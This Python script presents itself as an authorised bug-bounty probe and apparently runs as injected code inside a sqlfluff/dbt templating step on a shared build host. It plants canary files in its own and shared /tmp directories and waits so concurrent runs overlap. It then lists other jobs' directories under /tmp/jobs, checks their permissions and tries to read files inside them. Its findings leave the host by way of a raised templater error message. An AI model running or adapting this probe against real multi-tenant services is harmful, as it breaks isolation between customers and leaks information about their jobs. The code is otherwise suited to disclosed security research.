MARKER = 'A145F9_Z1_1B2047C13A46'

def _safe_uid(p):
    try:
        return os.stat(p).st_uid
    except Exception:
        return -1
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1, safe harbour).
Reads process-local directory NAMES, and the content of files whose names
this researcher chose and planted. No environment variables, no network,
no instance metadata, no credentials, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
HOLD = 150
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

SHARED = ("/tmp/" + CANARY, "/tmp/jobs/" + CANARY)
try:
    host = __import__("socket").gethostname()
    out["host"] = host
    mine = _mine()
    cwd = os.getcwd()
    t0 = time.time()
    # ---- 1. did an EARLIER run of ours leave a canary on this pod? ---------
    pre = []
    for p in SHARED:
        try:
            if os.path.isfile(p):
                with open(p) as fh:
                    pre.append([p, int(t0 - os.stat(p).st_mtime), fh.read()[:220]])
        except Exception as exc:
            pre.append([p, -1, "ERR:" + type(exc).__name__])
    out["preexisting_shared"] = pre
    out["n_preexisting_shared"] = len(pre)
    # ---- 2. plant self-identifying canaries -------------------------------
    body = json.dumps({"owner": "cleave-security-research",
                       "purpose": "authorised co-residency canary, dbt MBB",
                       "planted_by_run": mine, "planted_at": int(t0), "pod": host},
                      sort_keys=True)
    planted = []
    for p in (cwd + "/" + CANARY, "/tmp/jobs/" + mine + "/" + CANARY) + SHARED:
        try:
            with open(p, "w") as fh:
                fh.write(body + chr(10))
            planted.append([p[-46:], 1])
        except Exception as exc:
            planted.append([p[-46:], 0, type(exc).__name__])
    out["planted"] = planted
    # ---- 3. HOLD so concurrently dispatched runs overlap -------------------
    if HOLD:
        time.sleep(HOLD)
    out["held"] = HOLD
    # ---- 4. list /tmp/jobs: counts, ages, permission bits. No foreign id. --
    t1 = time.time()
    es = sorted(os.listdir("/tmp/jobs"))
    dirs = [e for e in es if os.path.isdir("/tmp/jobs/" + e)]
    out["n_entries"] = len(es)
    out["own_present"] = mine in es
    others = [e for e in dirs if e != mine]
    out["n_other"] = len(others)
    out["all_digit"] = all(e.isdigit() for e in dirs)
    rows = []
    for e in others:
        p = "/tmp/jobs/" + e
        try:
            age = int(t1 - os.stat(p).st_mtime)
        except Exception:
            age = -1
        rows.append([age, 1 if os.access(p, os.R_OK | os.X_OK) else 0,
                     1 if os.path.isdir(p + "/target") else 0])
    rows.sort()
    out["rows_age_readable_hastarget"] = rows[:30]
    # ---- 5. read back ONLY canaries we planted ourselves -------------------
    hits, probed, foreign = [], 0, 0
    for e in others:
        got = False
        for sub in ("", "/target"):
            p = "/tmp/jobs/" + e + sub + "/" + CANARY
            probed += 1
            try:
                if os.path.isfile(p):
                    with open(p) as fh:
                        hits.append([sub or "rundir", fh.read()[:300]])
                    got = True
            except Exception as exc:
                hits.append([sub or "rundir", "ERR:" + type(exc).__name__])
        if not got:
            foreign += 1
    out["n_siblings_probed"] = probed
    out["n_hits"] = len(hits)
    out["hits"] = hits[:5]
    out["n_siblings_without_our_canary"] = foreign
    out["scan_at"] = int(t1)
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
